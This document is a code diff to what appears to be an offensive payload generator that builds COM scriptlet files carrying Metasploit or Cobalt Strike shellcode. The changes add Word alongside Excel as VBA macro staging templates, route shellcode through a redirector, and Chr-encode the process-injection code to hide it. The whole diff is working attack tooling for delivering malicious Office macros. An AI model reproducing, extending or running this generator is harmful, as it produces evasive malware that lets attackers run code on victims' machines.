@@ -3,8 +3,7 @@ from uuid import uuid4
 from string import ascii_uppercase, digits
 from random import choice
 from shutil import copyfile, which
-from fileops import fileFindReplace
-from fileops import getFileStringLineNum
+from fileops import fileFindReplace, getFileStringLineNum
 import re
 from os import system
 from sys import exit
@@ -30,11 +29,18 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 	if 'CobaltStrike' in framework:
 		modifyCobaltStrikePayload(cspayload , x86, x64)
 	elif 'Metasploit' in framework:
-		if 'VBAMacro' in stagingMethod:
+		if 'Excel' in stagingMethod:
 			msfShellCode = getMetasploitShellCode(redirector)
-			macro = genVBAMacro(msfShellCode, x86, x64)
+			macro = genVBAMacro(stagingMethod, msfShellCode, x86, x64)
+		elif 'Word' in stagingMethod:
+			msfShellCode = getMetasploitShellCode(redirector)
+			macro = genVBAMacro(stagingMethod, msfShellCode, x86, x64)
+		else:
+			print('[-] ERROR: VBAMacro method is not supported. Exiting.')
+			exit()
+
 	else:
-		print('{0} framework is not supported yet' % framework)
+		print('{0} framework is not supported yet'.format(framework))
 
 def genProgID(size=8, chars=ascii_uppercase + digits):
 	'''
@@ -45,7 +51,7 @@ def genProgID(size=8, chars=ascii_uppercase + digits):
 	progid = ''.join(choice(chars) for _ in range(size))
 	return progid
 
-def genVBAMacro(shellCode, x86, x64):
+def genVBAMacro(template, shellCode, x86, x64):
 	'''
 	Generates a visual basic macro. This is a lazy version until we 
 	write a Chr encoding function that accounts for string concatenation
@@ -53,7 +59,7 @@ def genVBAMacro(shellCode, x86, x64):
 	VBA Macro COM Scriptlet template and we build the entire Chr encoded
 	string.
 	'''
-	copyfile('./templates/excel_vba_macro.sct', 'payload.sct')
+	copyfile('./templates/{0}_vba_macro.sct'.format(template.lower()), 'payload.sct')
 	fileFindReplace('payload.sct', 'exampleprogid', genProgID())
 	fileFindReplace('payload.sct', 'exampleclassid', str(genClassID()))
 	fileFindReplace('payload.sct', 'Array()', shellCode.rstrip())
@@ -64,11 +70,11 @@ def genVBAMacro(shellCode, x86, x64):
 	end = []
 
 	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, 0, getFileStringLineNum('xlmodule.CodeModule.AddFromString')):
+		for line in itertools.islice(payloadFile, 0, getFileStringLineNum('CodeModule.AddFromString')):
 			start.append(line)
 	
 	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, getFileStringLineNum('Private Type PROCESS_INFORMATION') - 1, getFileStringLineNum('objExcel.DisplayAlerts') - 1):
+		for line in itertools.islice(payloadFile, getFileStringLineNum('Private Type PROCESS_INFORMATION') - 1, getFileStringLineNum('DisplayAlerts') - 1):
 			if 'SysWOW64' in line:
 				textToEncode += line.replace('rundll32.exe' , x64)
 				textToEncodeList.append(line)
@@ -81,7 +87,7 @@ def genVBAMacro(shellCode, x86, x64):
 
 
 	with open('payload.sct', 'r') as payloadFile:
-		for line in itertools.islice(payloadFile, getFileStringLineNum('objExcel.DisplayAlerts') - 1, getFileStringLineNum('</scriptlet>') + 1):
+		for line in itertools.islice(payloadFile, getFileStringLineNum('DisplayAlerts') - 1, getFileStringLineNum('</scriptlet>') + 1):
 			end.append(line)
 
 	encodedList = convertToVBAFormat(encodeStringAsChr(textToEncode))
@@ -92,10 +98,13 @@ def genVBAMacro(shellCode, x86, x64):
 
 	with open('payload.sct', 'w') as payloadFile:
 		for item in payload:
-			if 'xlmodule.CodeModule.AddFromString' in item:
+			if 'CodeModule.AddFromString' in item:
 				payloadFile.write(item.rstrip() + ' ')
 			else:
 				payloadFile.write(item)
+
+	print(textToEncode)
+	print(start + encodedList + end)
 
 def getMetasploitShellCode(redirector):
 	'''
